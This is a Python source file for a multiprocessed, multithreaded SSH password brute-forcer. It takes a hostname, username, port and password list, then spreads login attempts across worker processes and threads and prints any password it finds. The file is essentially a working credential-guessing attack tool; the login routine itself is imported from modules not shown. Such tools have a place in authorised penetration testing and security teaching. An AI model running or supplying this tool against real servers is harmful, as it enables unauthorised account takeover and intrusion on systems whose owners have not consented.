import argparse
import multiprocessing
# from multiprocessing.queues 
# import multiprocessing.queues
import paramiko
from time import sleep
import threading
from termcolor import cprint
import queue
import sys
from typing import List 

from sshbruteforce import *
from producer import *
from consumer import *
import queuecontent

error_file = open("brute-ssh.log", "w")

class SSHBruteForceManager:
 
    """
    A class for managing an ssh brute force, automatically
    implements multiprocessed PasswordProducer, and PasswordResultConsumer
    for increase performance.

    Attributes:
        target (SSHTarget): contains hostname, port, username.
        passlist_filename (str): filepath of the password list.
        
        passwords_queue (multiprocessing.Queue): Populated with passwords by PasswordProducer
        results_queue (multiprocessing.Queue): Populated with results by SSHBruteForcers

        passsword_failed_n (int): Represents the number of failed password attempts (excluding login errors)    
    """

    def __init__(self, target: SSHTarget, passlist_filename: str):
        self.target = target # Our target ssh server
        self.passlist_filename = passlist_filename # Our filepath that contains the password (one password at a line)

        self.passwords_queue: multiprocessing.Queue = multiprocessing.Queue() # Queue for the passwords produced by PasswordProducer
        self.results_queue: multiprocessing.Queue = multiprocessing.Queue() # Queue for the results of the bruteforce

        self.running_bruteforce_proc: List[multiprocessing.Process] = [] # Will contain the bruteforcer process (only if multiprocessed bruteforce)
        self.password_failed_n: int = 0 # Counts the number of failed password attempts ( for printing purposes )


    def success_result_callback(self, queuedata) -> queuecontent.Signal:
        """
        This method is passed to the PasswordResultConsumer
        to be used as a callback if a success signal is recieved.
        
        args:
            queuedata (queuecontent.QueueData): Contains the signal and the password recieved.

        returns:
            queuecontent.Signal: A signal is returned to command the PasswordResultConsumer if needed.

        """
        cprint(f"\n[+] Found the password {queuedata.content}", "green", attrs=["bold"])
        return queuecontent.Signal.Finished
        
    def failed_result_callback(self, queuedata) -> queuecontent.Signal:
        """
        This method is passed to the PasswordResultConsumer
        to be used as a callback if a failed signal is recieved.
        
        args:
            queuedata (queuecontent.QueueData): Contains the signal and the password recieved.

        returns:
            queuecontent.Signal: A signal is returned to command the PasswordResultConsumer if needed.
        """
        cprint(f"[{self.password_failed_n}] not the password {queuedata.content}", "red")
        self.password_failed_n += 1
        return queuecontent.Signal.Blank

    def start_password_producer(self) -> None:
        """
        Creates a PasswordProducer and runs it as a seperate process.
        """
        self.password_producer = PasswordProducer(
            self.passlist_filename,
            self.passwords_queue,
        )
        self._password_producer_proc = multiprocessing.Process(
            target=self.password_producer.produce
        )
        self._password_producer_proc.start()

    def start_password_result_consumer(self) -> None:
        """
        Creates a PasswordConsumer instance stored as property for later use,
        and autoatically runs it as a seperate process
        """

        self.password_result_consumer = PasswordConsumer(
            self.results_queue,
            self.passwords_queue,
            success_callback=self.success_result_callback,
            failed_callback=self.failed_result_callback
        )
        self._password_result_consumer_proc = multiprocessing.Process(
            target=self.password_result_consumer.consume
        )
        self._password_result_consumer_proc.start()

    def start(
            self, 
            login_thread_n_each: int = 0, 
            process_n:int=0
        ) -> None:
        """
        Initiates the PasswordProducer and the PasswordResultConsumer,
        runs the appropriate bruteforcer configuration/setup, and 
        cleans/stops the PasswordProducer and the PasswordResultConsumer
        after bruteforcers are finished.

        args:
            login_thread_n_each (int): How many threads per process
            process_n (int): How many processes to spawn ( if 0, will used the current process for bruteforce )
        """
        self.start_password_producer()
        self.start_password_result_consumer()
        self.run_bruteforcers(
            login_thread_n_each,
            process_n
        )
        cprint(
            f"[SSHBruteForceManager]: Stopping password_producer and result_consumer", 
            "yellow", 
            attrs=["bold"]
        )

        self.password_producer.stop()
        self._password_producer_proc.kill()
        self.password_result_consumer.stop()
        self._password_result_consumer_proc.kill()
        

    def run_bruteforcers(
            self, 
            login_thread_n_each: int = 0, 
            process_n:int=0
        ) -> None:
        """
        Determines if it should run single or multi processed
        bruteforcer depending on the given process_n

        args:
            login_thread_n_each (int): How many threads per process
            process_n (int): How many processes to spawn ( if 0, will used the current process for bruteforce )
        """

        if process_n > 0:
            self.run_multiprocessed_bruteforcers(
                login_thread_n_each,
                process_n
            )
        else:
            self.run_single_bruteforcer(
                login_thread_n_each
            )
        


    def run_multiprocessed_bruteforcers(
            self, 
            login_thread_n_each: int = 0, 
            process_n:int=0
        ) -> None:
        """
        Creates the bruteforcers and runs it as a seperate process (multiprocessed).

        args:
            login_thread_n_each (int): How many threads per process
            process_n (int): How many processes to spawn ( if 0, will used the current process for bruteforce )
        """
        if process_n > 0:
            for _ in range(process_n):

                brute_forcer: SSHBruteForcer = self.create_bruteforcer(
                    login_thread_n=login_thread_n_each
                )
                brute_forcer_proc = brute_forcer.multiprocessed_run()
                self.running_bruteforce_proc.append(brute_forcer_proc)

        self.wait_for_bruteforcer_procs()

    def run_single_bruteforcer(
            self, 
            login_thread_n_each: int = 0, 
        ) -> None:
        """
        Creates and runs the bruteforcer without multiprocessing it,
        but number of threads specified will still apply
        
        args:
            login_thread_n_each (int): How many threads to run
        """
        brute_forcer: SSHBruteForcer = self.create_bruteforcer(
            login_thread_n=login_thread_n_each
        )
        brute_forcer.run()
        

    def create_bruteforcer(self, login_thread_n=0) -> SSHBruteForcer:
        """
        Creates a default preconfigured bruteforcer, that
        will be used regardless if singled or multi processed

        args:
            login_thread_n_each (int): How many threads to run
        """

        return SSHBruteForcer(
                    target=self.target,
                    passwords_queue=self.passwords_queue,
                    results_queue=self.results_queue,
                    login_thread_n=login_thread_n,
        )
    
    def wait_for_bruteforcer_procs(self) -> None:
        """Simply waits for the bruteforce processes to finish."""

        for bruteforcer_proc in self.running_bruteforce_proc:
            bruteforcer_proc.join()

if __name__ == '__main__':
    # Command line argument parsing
    parser = argparse.ArgumentParser(description="SSH Brute Force Tester")
    parser.add_argument("hostname", default="localhost", help="Hostname or IP of the SSH server")
    parser.add_argument("--username", "-u",help="Username for SSH login")
    parser.add_argument("--passlist", "-P", help="File containing list of passwords")
    parser.add_argument("--threads", "-t", type=int, default=10, help="Amount of threads per process")
    parser.add_argument("--processes", "--procs", type=int, default=0, help="Amount of processes")
    parser.add_argument("--port", "-p", type=int, default=22, help="SSH port (default is 22)")
    parser.add_argument("--debug", "-d", choices=["True", "False"], default="False", help="enable error outputs")

    args = parser.parse_args()
    sys.stderr = sys.stderr if str(args.debug).capitalize() == "True" else error_file
    process_n: int = int(args.processes if args.processes else 0)
    thread_n: int = int(args.threads if args.threads else 0)
    hostname: str = args.hostname
    port: int = int(args.port)
    username: str = args.username
    passlist: str = args.passlist

    cprint(f"[*] Starting SSH Bruteforce Session", "blue", attrs=["bold"])
    cprint(f"[*] Target: {username}@{hostname}:{port}", "blue")
    cprint(f"[*] Processes: {process_n}", "blue") if process_n else None
    cprint(f"[*] {'Threads each process' if process_n > 0 else 'Threads'}: {thread_n}", "blue")
    cprint(f"[*] Total threads: {thread_n * process_n if process_n > 0 else thread_n}", "blue") if process_n > 0 else None
    print("")

    # Create SSH target and initiate brute force
    target = SSHTarget(
        hostname=hostname, 
        port=port, 
        username=username
    )
    brute_forcer = SSHBruteForceManager(
        target, 
        passlist
    )
    brute_forcer.start(
        process_n=process_n ,
        login_thread_n_each=thread_n,
    )
    cprint("[*] Finished", "blue", attrs=["bold"])